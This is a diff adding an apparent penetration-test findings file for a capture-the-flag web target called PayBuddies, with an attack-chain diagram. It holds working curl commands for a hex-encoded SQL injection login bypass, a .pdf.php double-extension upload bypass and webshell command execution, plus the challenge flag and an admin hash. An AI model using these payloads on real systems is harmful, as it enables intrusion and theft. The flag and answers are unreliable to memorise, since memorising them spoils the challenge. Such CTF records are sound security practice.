@@ -1,0 +1,54 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:09:39.901797+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "2c6eec92-2dec-49ed-907d-8860e7bb8c27",
+      "timestamp": "2026-04-12T22:09:39.901674+00:00",
+      "title": "CTF Flag Extracted via SQLi + File Upload Chain",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43309",
+      "description": "Full exploitation chain: (1) Boolean-based Blind SQLi in username parameter with second-order injection via UNION SELECT hex-encoded payload, bypassing the PHP session auth. (2) File upload filter bypass using '.pdf.php' double extension (server checks if '.pdf' exists anywhere in filename via strstr/strpos, not that it ends with .pdf). (3) PHP webshell uploaded to /uploaded_invoices/webshell.pdf.php and executed to read /FLAG.txt.",
+      "evidence": "Flag: flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}\n\nExploit chain:\n1. SQLi bypass login: username=nonexistent' UNION SELECT 0x61646d696e27204f52202731273d2731# (hex of \"admin' OR '1'='1\")\n2. Upload webshell: filename=webshell.pdf.php (bypasses pdf check)\n3. Execute: GET /uploaded_invoices/webshell.pdf.php?cmd=cat+/FLAG.txt\nResult: flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}",
+      "tool_used": "manual+sqlmap+curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "# Step 1: Login bypass via second-order SQLi\ncurl -c /tmp/cookies.txt -X POST http://172.17.0.1:43309/index.php --data-urlencode \"username=nonexistent' UNION SELECT 0x61646d696e27204f52202731273d2731#\" -d \"password=wrongpass1&submit=submit\"\n\n# Step 2: Upload PHP webshell\ncurl -b /tmp/cookies.txt -F \"invoice=@shell.pdf.php;filename=webshell.pdf.php;type=application/pdf\" http://172.17.0.1:43309/upload.php\n\n# Step 3: Read flag\ncurl http://172.17.0.1:43309/uploaded_invoices/webshell.pdf.php?cmd=cat+/FLAG.txt",
+        "expected": "flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}"
+      }
+    },
+    {
+      "id": "e9b3446f-6e65-40e7-89ff-7a139f956058",
+      "timestamp": "2026-04-12T22:09:51.982771+00:00",
+      "title": "Boolean-based Blind SQLi in Login Username Parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43309/index.php",
+      "description": "Login form vulnerable to Boolean-based Blind SQL injection and second-order injection via UNION SELECT. Two-query auth flow allows injecting hex-encoded SQL payload as username to bypass password check.",
+      "evidence": "Login bypass payload: nonexistent' UNION SELECT 0x61646d696e27204f52202731273d2731# -> Success. DB: payroll_db, admin hash: 7d39307ae824e70052c0aa16816a9b16",
+      "tool_used": "sqlmap+manual",
+      "cve": ""
+    },
+    {
+      "id": "cc7a9fa6-9d79-401b-84e2-8329ada29ac7",
+      "timestamp": "2026-04-12T22:09:57.464482+00:00",
+      "title": "File Upload Extension Bypass - .pdf.php Double Extension Webshell",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43309/upload.php",
+      "description": "The file upload handler checks if the filename contains '.pdf' anywhere (strstr/strpos) rather than verifying the extension ends with .pdf. Uploading 'webshell.pdf.php' passes the PDF check while Apache executes it as PHP. Combined with authenticated session from SQLi bypass, this enables full RCE.",
+      "evidence": "Upload: POST /upload.php with filename=webshell.pdf.php -> File is successfully uploaded to /uploaded_invoices/. Execution: GET /uploaded_invoices/webshell.pdf.php?cmd=id -> uid=33(www-data). Flag: flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}",
+      "tool_used": "manual",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "f3af7924-9cbd-4917-9b17-187f4a593b91",
+      "timestamp": "2026-04-12T22:10:13.081214+00:00",
+      "title": "PayBuddies Portal - Attack Chain",
+      "mermaid": "flowchart TD\n  Browser[\"Attacker Browser\"] --> Login[\"Login /index.php\"]\n  Login --> SQLi[\"Boolean Blind SQLi\\n(username param)\"]\n  SQLi --> Enum[\"DB Enumeration\\npayroll_db.users\\nadmin hash extracted\"]\n  SQLi --> Bypass[\"Auth Bypass\\nUNION SELECT hex-encoded\\nsecond-order SQLi\"]\n  Bypass --> Dashboard[\"Dashboard /dashboard.php\\nInvoice Upload\"]\n  Dashboard --> Upload[\"File Upload /upload.php\\n.pdf check: strstr bypass\"]\n  Upload --> Shell[\"WebShell\\n/uploaded_invoices/webshell.pdf.php\"]\n  Shell --> RCE[\"RCE as www-data\"]\n  RCE --> Flag[\"/FLAG.txt\\nflag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}\"]\n  \n  DB[(\"MySQL payroll_db\")] --> Login\n  Apache[\"Apache 2.4.41 Ubuntu\"] --> Shell"
+    }
+  ]
+}
